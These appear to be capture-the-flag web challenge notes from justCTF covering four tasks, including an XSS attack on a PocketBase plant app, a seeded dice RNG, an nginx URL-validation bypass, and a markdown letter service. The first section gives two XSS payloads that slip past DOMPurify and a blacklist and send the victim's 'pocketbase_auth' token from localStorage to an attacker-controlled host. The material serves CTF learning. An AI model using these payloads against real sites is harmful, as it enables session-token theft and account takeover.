## justPocketTheBase
Points: 500
zazolcgeslajazn
WEB

The thing I love the most about ready-to-use backends and frameworks is that they are always secure :)

    http://justpocketthebase.web.jctf.pro

    https://s3.cdn.justctf.team/c5536ebc-945a-4fa7-af34-f064b29916d0/justpocketthebase_docker.tar.gz


- The application uses pocketbase javascript package in the version v0.22.12


It has a bot that uses the flag username to go to `http://localhost/view-plant?id=${id}` when we request `app.post('/report')` and send a id that is not null and is a string: 


```js
if (!req.body.id) {
			throw new Error('Invalid input.');
		}
		if (typeof req.body.id !== 'string') {
			throw new Error('Invalid input.');
		}
```

```js

export const report = async (id) => {
	if (!/^[a-zA-Z0-9]+$/.test(id) || id.length > 32) {
		throw new Error('Invalid id');
	}
	const browser = await puppeteer.launch({
		headless: 'new',
		pipe: true,
		args: ['--disable-gpu', '--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'],
		executablePath: '/usr/bin/chromium-browser'
	});
	const page = await browser.newPage();
	await page.goto('http://localhost');
	await page.type('input[type=text]', 'flag');
	await page.type('input[type=password]', PASSWORD);
	await page.click('button', { text: 'enter' });
	await page.waitForFunction(() => document.body.innerText.includes('Logged as'));
	await page.goto(`http://localhost/view-plant?id=${id}`);
	await sleep(15_000);
	await page.goto('http://localhost');
	await page.click('button', { text: 'Logout' });
	await browser.close();
};


```

The flag user has the flag in its plants collection:

```js
const seed = async (pb) => {
	const token = pb.authStore.baseToken;
	await createTable(token);
	const user = await pb.collection("users").create({
		username: "flag",
		password: flagPassword,
		passwordConfirm: flagPassword,
	});
	const flagFile = fs.readFileSync("./plants/polant.png");
	const formData = new FormData();
	formData.append("title", "flag");
	formData.append("creator", user.id);
	formData.append("img", new Blob([flagFile]), "flag.png");
	await pb.collection("plants").create(formData);
};
```


We can create plants however when the bot looks at the it will run dompurify and a blacklist against the tile:

```js
onMount(async () => {
		const params = new URLSearchParams(window.location.search);
		id = params.get('id');
		try {
			plant = await pb.collection('plants').getOne(id);
		} catch (error) {
			window.location.href = '/';
		} finally {
			isLoading = false;
		}
		setTimeout(() => {
			const sanitizedTitle = DOMPurify.sanitize(plant.title);
			const newTitleElement = document.createElement('div');
			newTitleElement.classList.add('title');
			newTitleElement.innerHTML = sanitizedTitle;
			const safe = newTitleElement.innerText;
			try {
				if (blacklist.some((word) => safe.toLowerCase().includes(word))) {
					throw new Error('not safe!!!');
				}
				title.innerHTML = safe;
			} catch (err) {
				window.location.href = '/';
			}
		}, 100);
	});
```

Additionally the image is inserted as background:

![1718453741422](image/writeup/1718453741422.png)

FInal Payload:

```

&lt;img src=x onerror=location.href=`\x2f\x2f<URL>\x2f${localStorage.getItem`pocketbase\x5fauth`}`&gt;
```

ANother payload:
- not purified
- i tags are remvove by text
- \x to escape stuff from blacklist

```
<i><</i>img src=a onerror=setTimeout`f\x65tch\x28\x22http\x3a\x2f\x2f<your-ip>\x3a8080\x2f\x22\x2blocalStorage.getItem\x28\x22pocketbase\x5fauth\x22\x29\x29`>
```

## Casino

Although the odds of winning are rigged, this casino is 100% fair! Can you win against the house?

The following its a game where we bet our balance with guesses that are generated "randomly".
The following function is the one that generates the right guess:

```js
let roll = (seedrandom(JSON.stringify({
        serverSeed: req.user.serverSeed,
        clientSeed,
        nonce: req.user.nonce++
    })).int32() >>> 0) % 6 + 1
```

We have client seed, the previous server seed, the previous server seed hash, the new server seed hash and the nonce.

## Bypass Backlash: Route Exploration

We've created the best hacker art ever! Wanna take a look?

```ruby
def serve
    # Make a request to the njs script to validate the image
    image_url = url_for(request.query_parameters.merge(controller: 'avatars', action: 'get', host: 'justcattheimages.s3.eu-central-1.amazonaws.com', subdomain: false, domain: 'justcattheimages.s3.eu-central-1.amazonaws.com', protocol: 'http', only_path: false, port: 80))
    image = HTTParty.get("http://nginx:8000/fetch?url=#{image_url}")
    send_data image, type: 'image/jpeg', disposition: 'inline'
  end
```

I think its a request smuggler because you cant call the /flag endpoitn directly, you need to use the avatar endpoint to fetch the image and call the same time the flag endpoint. However we need to bypass the following verification:

```js
function valid_url(r) {
    // Retrieve the URL parameter from the request
    var targetUrl = r.args.url;
    r.log(targetUrl);
    return targetUrl.match(/^https?:\/\/justcattheimages\.s3\.eu-central-1\.amazonaws\.com\/img\/[a-z]+\.jpg$/m) ? "" : "Forbidden"
}
```




## Letters

Simple letter service which (kinda) supports markdown

This is a python service that allows to create letters with title, recipient and content. The content is then rendered with markdown: `content=markdown2.markdown(letter.content)`. However the content needs to be in the following regex: `^[a-zA-Z0-9 \n#_*]+$`.